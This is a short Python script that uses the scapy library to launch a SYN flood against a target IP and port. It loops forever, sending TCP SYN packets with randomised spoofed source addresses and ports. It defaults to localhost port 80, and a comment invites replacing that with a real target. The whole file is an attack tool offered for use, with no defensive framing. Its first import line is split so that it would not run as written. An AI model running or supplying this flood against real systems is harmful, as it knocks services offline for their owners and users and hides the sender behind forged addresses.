from scapy.all 
import IP, TCP, send
import random
import time

def syn_flood(target_ip, target_port):
    print(f"[+] Starting SYN flood on {target_ip}:{target_port}")
    while True:
        src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        src_port = random.randint(1024, 65535)
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))
        packet = ip_layer / tcp_layer
        send(packet, verbose=False)
        time.sleep(0.01)  # Optional throttling

if __name__ == "__main__":
    syn_flood("127.0.0.1", 80)  # Replace with target IP and port
